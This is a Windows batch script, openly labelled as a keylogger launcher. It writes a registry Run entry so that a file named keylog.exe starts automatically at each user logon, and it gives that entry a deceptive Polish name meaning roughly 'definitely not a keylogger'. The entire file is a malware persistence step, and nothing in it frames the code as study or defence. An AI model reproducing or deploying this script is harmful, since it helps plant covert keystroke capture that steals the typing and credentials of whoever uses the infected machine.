@echo off
title keylogger bat
echo Key logger bat starting
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V "NapewnoNieKeylogger" /t REG_SZ /F /D "\"%~dp0keylog.exe\""